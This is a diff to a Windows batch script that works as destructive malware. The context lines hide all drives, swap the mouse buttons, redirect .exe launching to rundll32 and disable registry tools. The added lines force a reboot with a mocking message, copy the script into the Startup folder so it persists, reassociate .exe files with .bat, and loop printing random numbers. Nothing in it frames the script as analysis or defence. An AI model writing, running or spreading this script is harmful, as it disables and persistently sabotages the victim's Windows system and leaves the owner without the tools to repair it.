@@ -1,4 +1,6 @@
 @echo off
+shutdown /r /t 25 /c "LOL"​
+copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDrives /t REG_DWORD /d 67108863 /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f 
 reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v "NoSelectDownloadDir" /d 1 /f 
@@ -33,3 +35,9 @@ reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ
 start rundll32 user32, SwapMouseButton 
 reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
+assoc .exe=.bat
+
+:x
+color 02
+echo %random% %random% %random% %random% %random% %random% %random% %random%
+goto x
